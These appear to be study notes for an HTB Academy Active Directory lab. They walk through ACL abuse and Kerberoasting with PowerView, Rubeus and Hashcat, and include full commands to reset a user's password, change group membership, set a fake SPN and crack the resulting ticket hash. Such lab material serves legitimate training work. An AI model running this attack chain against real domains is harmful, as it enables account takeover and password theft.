## 2. Important Concepts

### What is an ACL?

ACL stands for **Access Control List**.

It defines which users or groups have permission to perform actions on an object.

In Active Directory, ACL permissions can allow users to:
- Change another user's password.
- Modify group membership.
- Modify user account properties.
- Control other AD objects.

### What is ACL Abuse?

ACL abuse happens when an attacker takes advantage of permissions that have been assigned to an account.

For example, if a user has permission to change another user's password, that permission may be abused to gain control of the account.

### What is an SPN?

SPN stands for **Service Principal Name**.

An SPN identifies a service running under an account in Active Directory.

Example:

`MSSQLSvc/server.domain.local:1433`

An SPN tells Kerberos which account is associated with a particular service.

**Important:** Kerberoasting targets accounts that have SPNs assigned to them.

### What is Kerberoasting?

Kerberoasting is an Active Directory attack in which an authenticated domain user requests a Kerberos service ticket (TGS) for an account with an SPN.

The ticket contains encrypted material that can be taken offline and attacked with password-cracking tools.

Basic process:

1. Find an account with an SPN.
2. Request its Kerberos service ticket.
3. Extract the ticket hash.
4. Crack the hash offline.
5. Recover the account's password if it is weak enough.

## 3. Attack Flow

The lab uses the following attack chain:

1. Use the `wley` account to reset `damundsen`'s password.
2. Authenticate as `damundsen`.
3. Add `damundsen` to the `Help Desk Level 1` group.
4. Use the resulting permissions to modify `adunn`.
5. Set a fake SPN on `adunn`.
6. Kerberoast `adunn` using Rubeus.
7. Crack the hash using Hashcat.

## 4. Step 1 – Prepare PowerView

Open PowerShell on the lab machine and move to the tools directory:

```powershell
cd C:\Tools
```

Import PowerView:

```powershell
Import-Module .\PowerView.ps1
```

PowerView is a PowerShell tool used for Active Directory enumeration and interaction.

**Note:** The following steps require the `wley` password obtained in the earlier lab exercise. It is not provided in these notes.

---

## 5. Step 2 – Reset damundsen's Password

Create a secure string containing the `wley` password:

```powershell
$SecPassword = ConvertTo-SecureString 'WLEY_PASSWORD' -AsPlainText -Force
```

Create credentials for `wley`:

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Set the new password for `damundsen`:

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

**What does this do?**

- `Set-DomainUserPassword` changes an AD user's password.
- `-Identity damundsen` specifies the target account.
- `-AccountPassword` supplies the new password.
- `-Credential $Cred` uses the `wley` credentials.

The command succeeds only if `wley` has the required permission.

---

## 6. Step 3 – Authenticate as damundsen

Create credentials for the account whose password was just changed:

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Now `$Cred2` contains the credentials for `damundsen`.

---

## 7. Step 4 – Add damundsen to a Group

Run:

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Verify group membership:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

**What does this do?**

- `Add-DomainGroupMember` adds a user to an AD group.
- `-Identity` specifies the group.
- `-Members` specifies the user.

The group membership provides the permissions used in the next stage of the lab.

---

## 8. Step 5 – Set a Fake SPN for adunn

Run:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

**What does this do?**

- `Set-DomainObject` modifies an Active Directory object.
- `-Identity adunn` specifies the target account.
- `serviceprincipalname` is the AD attribute being modified.
- `notahacker/LEGIT` is the fake SPN value.

The objective is to assign an SPN to `adunn`, making the account suitable for the Kerberoasting exercise.

**Important:** This requires sufficient permissions to modify the target account.

---

## 9. Step 6 – Kerberoast Using Rubeus

Move to the tools directory:

```powershell
cd C:\Tools
```

Run:

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

**What does this do?**

| Part | Meaning |
|---|---|
| `Rubeus.exe` | Kerberos attack and interaction tool |
| `kerberoast` | Requests and extracts Kerberos service-ticket material |
| `/user:adunn` | Targets the `adunn` account |
| `/nowrap` | Prints the hash without line wrapping |

Rubeus should return a hash similar in format to:

```text
$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$...
```

This is the Kerberos TGS hash that will be cracked.

**Save the complete hash.** Do not copy only part of it.

---

## 10. Step 7 – Crack the Hash Using Hashcat

Move to your Kali Linux machine.

Create a file:

```bash
nano adunn.hash
```

Paste the complete Rubeus hash into the file.

Save and exit.

Check whether the RockYou wordlist is available:

```bash
ls /usr/share/wordlists/
```

If it is compressed, extract it:

```bash
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Run Hashcat:

```bash
hashcat -m 13100 adunn.hash /usr/share/wordlists/rockyou.txt
```

### Understanding the command

| Option | Meaning |
|---|---|
| `hashcat` | Password-cracking tool |
| `-m 13100` | Kerberos 5 TGS-REP etype 23 (RC4-HMAC) |
| `adunn.hash` | File containing the extracted hash |
| `rockyou.txt` | Password wordlist |

If Hashcat cracks the hash, display the recovered password:

```bash
hashcat -m 13100 adunn.hash /usr/share/wordlists/rockyou.txt --show
```

The output will contain the hash and its recovered plaintext password.

**Submit the recovered password as the HTB Academy answer.**

## 13. Key Takeaways

1. **ACL:** Controls permissions on Active Directory objects.
2. **ACL Abuse:** Uses excessive or misconfigured permissions to gain control over accounts or objects.
3. **SPN:** Identifies a service associated with an AD account.
4. **Kerberoasting:** Requests a service ticket and attacks its encrypted material offline.
5. **Rubeus:** Used to extract the Kerberos service-ticket hash.
6. **Hashcat:** Used to crack the extracted hash.
7. **Mode 13100:** Used for Kerberos 5 TGS-REP etype 23 (RC4-HMAC).

**Remember the attack chain:**

`ACL Permissions → Account Control → Group Membership → Fake SPN → Kerberoasting → Hashcat → Plaintext Password`
